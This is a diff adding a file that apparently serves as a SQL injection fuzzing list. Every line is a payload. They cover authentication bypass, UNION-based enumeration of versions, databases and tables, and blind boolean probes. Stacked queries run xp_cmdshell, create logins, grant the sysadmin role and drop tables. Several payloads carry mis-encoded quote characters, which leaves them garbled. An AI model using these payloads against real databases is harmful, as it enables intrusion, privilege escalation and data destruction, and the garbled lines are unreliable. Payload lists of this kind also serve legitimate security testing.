@@ -1,0 +1,53 @@
+fooÕ)--
+fooÕ, 1)--
+fooÕ, 1, 1)--
+fooÕ, 1, 1, 1)--
+Õ OR 1=1--
+Õ OR ÔaÕ = Ôa --
+adminÕ or 1=1--
+'adminÕ or 1=1--
+1 ASC --
+1 DESC --
+' 1 ASC --
+' 1 DESC --
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users;
+' ; drop table temp --
+'1 and 1 in (select @@version) and 1=1 --
+'1 and 1 in (select @@version) and 1=2 --
+'exec sp_addlogin 'name' , 'password' --
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' grant connect to name; grant resource to name; --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+' EXEC (@@PACK_RECEIVED-@@PACK_RECEIVED) --
+OR @@PACK_RECEIVED-@@PACK_RECEIVED --
+' OR @@PACK_RECEIVED-@@PACK_RECEIVED --
+Ô UNION SELECT @@version,NULL,NULL--
+admin' AND 1=1--
+admin' AND 1=2--
+adminÕ AND ASCII(SUBSTRING(ÔAdminÕ,1,1)) = 65 --
+adminÕ AND ASCII(SUBSTRING(ÔAdminÕ,1,1)) = 66 --
+1 and user_name() = 'dbo'
+\'; desc users; --
+1\'1
+1' and non_existant_table = '1
+' or username is not NULL or username = '
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116 --
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+1 uni/**/on select all from where
+master..syslogins, master..sysprocesses
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID; --
+SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);--
+SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition') --
+SELECT name FROM master..sysdatabases;
+SELECT DB_NAME(5);
+UNION SELECT name FROM master..sysobjects WHERE xtype='U' --
